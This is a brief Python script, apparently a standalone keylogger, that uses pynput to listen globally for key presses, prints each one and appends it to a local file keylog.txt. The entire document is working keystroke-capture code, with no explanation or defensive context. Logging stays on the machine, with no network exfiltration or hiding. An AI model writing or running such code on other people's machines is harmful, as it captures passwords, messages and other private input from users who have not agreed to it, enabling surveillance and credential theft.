from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keylog.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except AttributeError:
            # Handle special keys (e.g., space, enter, backspace)
            logkey.write('[' + str(key) + ']')

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join()
